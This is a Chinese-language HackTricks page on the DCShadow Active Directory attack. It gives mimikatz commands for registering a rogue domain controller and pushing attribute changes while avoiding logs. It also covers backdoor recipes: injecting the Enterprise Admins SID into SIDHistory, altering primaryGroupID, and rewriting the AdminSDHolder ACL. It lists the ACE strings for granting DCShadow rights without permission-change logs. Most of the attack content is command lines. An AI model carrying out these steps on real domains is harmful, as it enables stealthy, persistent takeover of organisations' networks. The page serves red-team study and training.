{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 **上关注我们** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}


# DCShadow

它在 AD 中注册一个 **新的域控制器**，并使用它在指定对象上 **推送属性**（SIDHistory, SPNs...） **而不**留下任何关于 **修改** 的 **日志**。你 **需要 DA** 权限并且在 **根域** 内。\
请注意，如果使用错误的数据，会出现相当难看的日志。

要执行攻击，你需要 2 个 mimikatz 实例。其中一个将以 SYSTEM 权限启动 RPC 服务器（你必须在这里指明你想要执行的更改），另一个实例将用于推送值：

{% code title="mimikatz1 (RPC servers)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - 需要 DA 或类似权限" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

注意 **`elevate::token`** 在 `mimikatz1` 会话中无法工作，因为它提升了线程的权限，但我们需要提升 **进程的权限**。\
您还可以选择并“LDAP”对象：`/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

您可以从 DA 或具有以下最小权限的用户推送更改：

* 在 **域对象**中：
* _DS-Install-Replica_（在域中添加/删除副本）
* _DS-Replication-Manage-Topology_（管理复制拓扑）
* _DS-Replication-Synchronize_（复制同步）
* **配置容器**中的 **站点对象**（及其子对象）：
* _CreateChild 和 DeleteChild_
* **注册为 DC 的计算机对象**：
* _WriteProperty_（不是 Write）
* **目标对象**：
* _WriteProperty_（不是 Write）

您可以使用 [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) 将这些权限授予无特权用户（注意这会留下某些日志）。这比拥有 DA 权限要严格得多。\
例如：`Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` 这意味着用户名 _**student1**_ 在机器 _**mcorp-student1**_ 上登录时对对象 _**root1user**_ 拥有 DCShadow 权限。

## 使用 DCShadow 创建后门

{% code title="将 SIDHistory 中的企业管理员设置为用户" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="更改 PrimaryGroupID (将用户作为域管理员的成员)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="修改 AdminSDHolder 的 ntSecurityDescriptor（给予用户完全控制权限）" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - 使用 DCShadow 授予 DCShadow 权限（无修改权限日志）

我们需要在用户的 SID 末尾附加以下 ACE：

* 在域对象上：
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* 在攻击者计算机对象上：`(A;;WP;;;UserSID)`
* 在目标用户对象上：`(A;;WP;;;UserSID)`
* 在配置容器中的站点对象上：`(A;CI;CCDC;;;UserSID)`

要获取对象的当前 ACE：`(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

请注意，在这种情况下，您需要进行**多个更改，**而不仅仅是一个。因此，在**mimikatz1 会话**（RPC 服务器）中，使用每个要进行的更改的参数 **`/stack`**。这样，您只需**`/push`**一次即可在流氓服务器上执行所有堆积的更改。



[**有关 DCShadow 的更多信息，请访问 ired.team。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
